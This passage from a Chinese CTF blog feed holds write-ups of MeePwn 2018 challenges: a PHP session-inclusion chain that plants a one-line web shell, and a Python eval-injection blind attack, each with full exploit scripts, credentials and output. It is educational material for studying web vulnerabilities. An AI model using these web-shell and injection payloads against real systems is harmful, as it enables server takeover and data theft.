header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function save_command($email,$salt,$data)&#123;</span></span><br><span class="line"><span class="comment">$dir='./upload/'.md5($salt.$email);</span></span><br><span class="line"><span class="comment">file_put_contents($dir.'/command.txt', $data);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在<code>CHARACTER</code> 页面修改<code>command.txt</code> ，但两处都是由<code>GET</code> 或<code>POST</code> 传的参，参数被黑名单过滤导致无法直接发挥作用。</p><p>考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在<code>command.txt</code> 写入编码后的无害字符串，在Cookie写入利用伪协议读取 <code>command.txt</code>  并解码的语句，就成功向Session文件写入了一句话。</p><p>其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>在SETTING处修改用户名为<code>&lt;?=include&quot;$_COOKIE[a]</code> </li><li>在Fiddler的Filters处的Cookie后面添加上一条<code>a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt</code></li><li>在character处给宠物发一条命令 <code>PD89YCRfR0VUW2ZdYDs</code> 从而写入<code>command.txt</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PD89YCRfR0VUW2ZdYDs 可解码为 &lt;?=`$_GET[f]`;</span></span><br></pre></td></tr></table></figure><p><img src="1532072718776.png" alt="1532072718776"></p><ul><li>在admin处给自己送一只宠物</li></ul><p><img src="1532072632523.png" alt="1532072632523"></p><p>使执行语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br></pre></td></tr></table></figure><p>而其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;]</code> 正是用户名<code>&lt;?=include&quot;$_COOKIE[a]</code> </p><p>所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。</p><ul><li>读到数据库配置文件</li></ul><p><img src="1532073478518.png" alt="1532073478518"></p><ul><li>读到配置文件dbconnect.php </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'DBHOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DBUSER'</span>, <span class="string">'mapl_story_user'</span>);</span><br><span class="line">define(<span class="string">'DBPASS'</span>, <span class="string">'tsu_tsu_tsu_tsu'</span>); </span><br><span class="line">define(<span class="string">'DBNAME'</span>, <span class="string">'mapl_story'</span>);</span><br><span class="line">$conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);</span><br><span class="line"><span class="keyword">if</span> ( !$conn ) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connection failed : "</span> . mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>然后执行命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;SELECT * FROM mapl_config;&apos;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br><span class="line">或</span><br><span class="line">mysql -e&apos;select * from mapl_config&apos; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br></pre></td></tr></table></figure><p><img src="1532073884330.png" alt="1532073884330"></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>也可参考脚本理清利用过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(cmd=<span class="string">"testcmd"</span>)</span>:</span></span><br><span class="line">    payload = dict(command=cmd, submit=<span class="string">"Send"</span>)</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url + <span class="string">"?page=character.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"ojbk@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">    a=<span class="string">"php://filter/convert.base64-decode/resource=upload/%s/command.txt"</span> %</span><br><span class="line">    hashlib.md5(salt + user_email).hexdigest())</span><br><span class="line">change_name(<span class="string">'&lt;?=include"$_COOKIE[a]'</span>)</span><br><span class="line"><span class="comment"># 修改用户名使读Session文件时包含进Cookie['a']，即command.txt得base64解码</span></span><br><span class="line">cmd = base64.b64encode(<span class="string">"&lt;?=`$_GET[f]`;"</span>)  <span class="comment">#'PD89YCRfR0VUW2ZdYDs='</span></span><br><span class="line">command(cmd[:<span class="number">19</span>])  <span class="comment"># 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码</span></span><br><span class="line">give_pet(user_email)  <span class="comment"># 使Session文件中的action值为"Give $pet to  player $username"</span></span><br><span class="line">cmd = <span class="string">"mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story"</span></span><br><span class="line"><span class="keyword">print</span> shell(cmd)</span><br><span class="line"><span class="comment"># mapl_salt      mapl_key        mapl_now_get_your_flag</span></span><br><span class="line"><span class="comment"># ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF&#123;__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___&#125;</span></span><br></pre></td></tr></table></figure><h1 id="另一种思路：拼接-SESSION-变量"><a href="#另一种思路：拼接-SESSION-变量" class="headerlink" title="另一种思路：拼接$_SESSION 变量"></a>另一种思路：拼接<code>$_SESSION</code> 变量</h1><p>另外， <a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">这篇文章</a> 里提供的一种拼接<code>$_SESSION</code> 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"mapl@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line"></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    change_name(s)</span><br><span class="line">    give_pet(user_email)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">    <span class="keyword">print</span> shell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]='*/'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=';'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='"'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&lt;'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='='/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=' '/*</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'`echo PD89YCRfR0VUWzFdYDsK|base64 -d &gt;&gt; upload/%s/command.txt`'</span> % hashlib.md5(</span><br><span class="line">    salt + user_email).hexdigest()</span><br><span class="line">payload3 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=''/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&gt;'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]?&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxx</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload1.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload2:</span><br><span class="line">        p = <span class="string">"&lt;?=$_SESSION[a].='%s'/*"</span> % c</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload3.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxx()</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(salt + user_email).hexdigest()</span><br><span class="line"><span class="comment"># 可通过运行结果理解payload的巧妙</span></span><br><span class="line"><span class="comment"># 结果存放在</span></span><br><span class="line"><span class="comment"># https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt</span></span><br><span class="line"><span class="comment"># shell at </span></span><br><span class="line"><span class="comment"># http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt&amp;1=ls</span></span><br></pre></td></tr></table></figure><p><img src="1532114006803.png" alt="1532114006803"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://ctftime.org/writeup/10418" target="_blank" rel="noopener">https://ctftime.org/writeup/10418</a> </p><p><a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">MeePwn CTF 2018 Qual - Maple Story</a>   </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;本文首发 &lt;a href=&quot;https://xz.aliyun.com/t/2463&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区&lt;/a&gt; ，转载请注明链接。&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;本题考察PHP源码审计。主要有两个缺
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入</title>
    <link href="https://findneo.github.io/180719MeePwn_py3Inject/"/>
    <id>https://findneo.github.io/180719MeePwn_py3Inject/</id>
    <published>2018-07-19T01:10:50.000Z</published>
    <updated>2019-01-25T23:21:37.026Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文首发 <a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><h1 id="PyCalx"><a href="#PyCalx" class="headerlink" title="PyCalx"></a>PyCalx</h1><blockquote><p>This code is supposed to be unexploitable :/ another pyjail?<br><a href="http://178.128.96.203/cgi-bin/server.py?source=1" target="_blank" rel="noopener">[Source]</a><br><a href="http://178.128.96.203/cgi-bin/server.py?value1=123&amp;op=%3D%3D&amp;value2=123" target="_blank" rel="noopener">Try this </a>or <a href="http://178.128.96.203/cgi-bin/server.py?value1=abc&amp;op=%3D%3D&amp;value2=abc" target="_blank" rel="noopener">this</a><br>Notice: The flag may contain non alphabetic characters (but still printable)</p></blockquote><p>本题由Python的 <code>eval()</code> 函数参数可控且直接拼接引发的注入，采用二分法盲注。</p><p>server.py源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">'/var/www/flag'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">OK_200 = <span class="string">"some HTML code"</span></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'source'</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">'source'</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">'1'</span>:</span><br><span class="line">    print(<span class="string">'&lt;pre&gt;'</span> + escape(str(open(__file__, <span class="string">'r'</span>).read())) + <span class="string">'&lt;/pre&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'value1'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'value2'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'op'</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>,</span><br><span class="line">                     <span class="string">'"'</span>]  <span class="comment"># I don't like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid value&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'!'</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid op&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">'op'</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">'value1'</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">'value2'</span>].value)</span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">'&lt;center&gt;Types of the values don\'t match&lt;/center&gt;'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">'&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class="col-md-8"&gt;&lt;pre&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt;&gt; print('</span> + escape(calc_eval) + <span class="string">')'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">'True'</span> <span class="keyword">or</span> result == <span class="string">'False'</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">"Invalid"</span></span><br><span class="line">            )  <span class="comment"># Sorry we don't support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid"</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure><p>大意如下：</p><ul><li>cgi会处理source，value1，value2，op四个参数。</li><li>如果source=1则打印源代码。</li><li>value1，value2，op三个参数都有值时进一步处理。<ul><li>value1，value2至少1个字符，至多64个，且不包含黑名单<code>()[]&#39;&quot;</code> 里的字符。</li><li>op至少1个字符，至多2个，且首字符必须在白名单<code>+-*/=!</code> 里。</li><li>value1,value2要么都是只包含<code>[0-9]</code>，要么都包含其他字符。</li><li>执行<code>str(eval(str(repr(value1)) + str(op) + str(repr(value2))))</code> ，且只有结果是bool值或只包含<code>[0-9]</code> 时才会输出。<ul><li>注：repr返回对象的可打印形式，和反引号包裹效果一致，对大多数类型，他会返有一个字符串，使其可以作为代码直接传入eval执行。</li></ul></li></ul></li></ul><p>解题思路：<code>op</code> 允许两个字符，且第二个字符是任意的，那么如果是一个单引号，就能混淆代码和数据，起到类似SQL注入的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+"</span>)+str(repr(<span class="string">"b"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+'"</span>)+str(repr(<span class="string">"&lt; b#"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">''</span>&lt; b<span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://178.128.96.203/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment"># print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span 